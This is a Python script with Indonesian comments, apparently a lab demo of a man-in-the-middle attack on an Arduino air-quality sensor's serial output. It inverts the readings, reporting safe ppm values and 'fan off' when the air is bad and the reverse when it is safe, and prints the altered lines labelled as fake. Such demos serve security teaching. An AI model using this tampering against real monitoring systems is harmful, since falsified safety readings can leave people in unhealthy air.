import serial
import time
import sys
import re
import random # Diperlukan untuk data palsu acak

# --- KONFIGURASI SERIAL ---
# GANTI dengan port yang terdeteksi di Kali Linux Anda
SERIAL_PORT = '/dev/ttyUSB0' 
BAUD_RATE = 9600 
# --------------------------

# AMBANG BATAS PADA LOGIKA ARDUINO
THRESHOLD_HIGH_A0 = 350 # Analog 350
THRESHOLD_LOW_A0 = 330  # Analog 330
# Karena kita bekerja dengan PPM (0-1000), kita konversi ambang batas analog ke PPM
# THRESHOLD_HIGH_PPM = map(350, 0, 1023, 0, 1000) = ~342 PPM
THRESHOLD_HIGH_PPM = 342
THRESHOLD_LOW_PPM = 322 


def modify_data(raw_data):
    """
    Fungsi untuk memodifikasi data yang diterima dari Arduino menjadi data palsu dinamis.
    """
    modified_data = raw_data
    
    # Mencari pola PPM (angka) setelah "Kualitas Udara Saat Ini: "
    match = re.search(r"Kualitas Udara Saat Ini: (\d+) ppm", raw_data)
    
    if match:
        ppm_asli = int(match.group(1)) # Nilai PPM asli
        ppm_dimodifikasi = ppm_asli
        
        # --- LOGIKA MODIFIKASI DATA DINAMIS (SERANGAN) ---
        
        # Logika: Jika PPM ASLI menunjukkan udara BURUK, laporkan nilai ACARA AMAN, dan sebaliknya.
        
        if ppm_asli >= THRESHOLD_HIGH_PPM:
            # Skenario 1: Udara BURUK (Kipas seharusnya ON)
            # Kita laporkan nilai acak di zona AMAN (di bawah THRESHOLD_LOW_PPM)
            # Acak antara 50 - 150 PPM
            ppm_dimodifikasi = random.randint(50, 150)
            status_kipas_palsu = "Kipas OFF (Udara Normal)."
            
        elif ppm_asli <= THRESHOLD_LOW_PPM:
            # Skenario 2: Udara AMAN (Kipas seharusnya OFF)
            # Kita laporkan nilai acak di zona BURUK (di atas THRESHOLD_HIGH_PPM)
            # Acak antara 600 - 850 PPM
            ppm_dimodifikasi = random.randint(600, 850)
            status_kipas_palsu = "Kipas ON (Udara Buruk)."
            
        else:
            # Skenario 3: Di zona hysteresis atau stabil, laporkan nilai acak yang sedikit berbeda
            ppm_dimodifikasi = random.randint(ppm_asli - 10, ppm_asli + 10)
            
            # Pertahankan status kipas yang dilaporkan Arduino (hanya ubah PPM)
            if "Kipas ON" in raw_data:
                 status_kipas_palsu = "Kipas ON."
            else:
                 status_kipas_palsu = "Kipas OFF."


        # 1. Ganti nilai PPM di string asli
        # Hanya ganti kemunculan pertama angka (yaitu nilai PPM)
        modified_data_temp = re.sub(r'(\d+)\s+ppm', f'{ppm_dimodifikasi} ppm', raw_data, 1)

        # 2. Ganti status kipas yang dilaporkan
        # Asumsikan status kipas selalu berada setelah " | "
        if " | " in modified_data_temp:
             prefix, suffix = modified_data_temp.split(" | ", 1)
             modified_data = f"{prefix} | {status_kipas_palsu}"
        else:
             modified_data = modified_data_temp # Jika format tidak sesuai, pakai yang PPM saja

        # 3. Tambahkan indikator MITM
        modified_data += " [DATA PALSU DINAMIS]"
        
        # ------------------------------------------

    return modified_data


# 1. Buka Koneksi Serial
try:
    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=1)
    print(f"[*] MITM Aktif. Terhubung ke port: {SERIAL_PORT} @ {BAUD_RATE} bps")
    print("[*] Menunggu data dari Arduino...")
except serial.SerialException as e:
    print(f"[!] GAGAL membuka port {SERIAL_PORT}. Error: {e}")
    sys.exit(1)

# 2. Loop Utama
try:
    while True:
        if ser.in_waiting > 0:
            raw_data = ser.readline().decode('utf-8').strip()

            if raw_data and "Kualitas Udara" in raw_data:
                data_dimodifikasi = modify_data(raw_data)

                # Tampilkan hasil
                print(f"[ASLI] : {raw_data}")
                print(f"[UBAH] : {data_dimodifikasi}")
                print("-" * 50)

        time.sleep(0.1) 
        
except KeyboardInterrupt:
    print("\n[INFO] Skrip dihentikan.")
finally:
    if 'ser' in locals() and ser.is_open:
        ser.close()
        print("[*] Koneksi serial ditutup.")
